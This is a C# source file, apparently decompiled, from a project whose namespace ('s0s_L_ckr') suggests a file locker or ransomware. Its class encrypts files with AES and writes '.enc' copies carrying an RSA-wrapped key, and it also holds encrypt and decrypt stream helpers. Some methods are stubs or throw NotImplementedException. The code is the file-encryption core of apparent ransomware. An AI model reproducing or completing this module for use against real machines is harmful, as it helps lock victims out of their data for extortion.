using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace s0s_L_ckr;

public sealed class CriptoFilMgr
{
	private CriptoFilMgr()
	{
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public static void Encrypt(Stream stream, ref byte[] srceDat)
	{
		try
		{
			using ICryptoTransform transform = CriptoKeyMgr.CURR_AES_ENC_ENG.CreateEncryptor();
			using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
			cryptoStream.Write(srceDat, 0, srceDat.Length);
		}
		catch
		{
			throw new NotImplementedException();
		}
	}

	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public static void EncryptFile(string inFile)
	{
		CspParameters parameters = new CspParameters();
		Aes aes = Aes.Create();
		ICryptoTransform transform = aes.CreateEncryptor();
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(parameters);
		byte[] array = rSACryptoServiceProvider.Encrypt(aes.Key, fOAEP: false);
		byte[] array2 = new byte[4];
		byte[] array3 = new byte[4];
		int num = array.Length;
		array2 = BitConverter.GetBytes(num);
		int num2 = aes.IV.Length;
		array3 = BitConverter.GetBytes(num2);
		int num3 = inFile.LastIndexOf("\\") + 1;
		string path = inFile.Substring(num3, inFile.LastIndexOf(".") - num3) + ".enc";
		using FileStream fileStream = new FileStream(path, FileMode.Create);
		fileStream.Write(array2, 0, 4);
		fileStream.Write(array3, 0, 4);
		fileStream.Write(array, 0, num);
		fileStream.Write(aes.IV, 0, num2);
		using (CryptoStream cryptoStream = new CryptoStream(fileStream, transform, CryptoStreamMode.Write))
		{
			int num4 = 0;
			int num5 = 0;
			int num6 = aes.BlockSize / 8;
			byte[] buffer = new byte[num6];
			int num7 = 0;
			using (FileStream fileStream2 = new FileStream(inFile, FileMode.Open))
			{
				do
				{
					num4 = fileStream2.Read(buffer, 0, num6);
					num5 += num4;
					cryptoStream.Write(buffer, 0, num4);
					num7 += num6;
				}
				while (num4 > 0);
				fileStream2.Close();
			}
			cryptoStream.FlushFinalBlock();
			cryptoStream.Close();
		}
		fileStream.Close();
	}

	internal static void EncryptFile(FileStream fileStream)
	{
		throw new NotImplementedException();
	}

	public static void Decrypt(Stream stream, ref byte[] fileEnc, int startPos, byte[] key, byte[] iv)
	{
		using ICryptoTransform transform = CriptoKeyMgr.CURR_AES_ENC_ENG.CreateDecryptor(key, iv);
		using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
		cryptoStream.Write(fileEnc, startPos, fileEnc.Length - startPos);
		cryptoStream.Flush();
	}
}
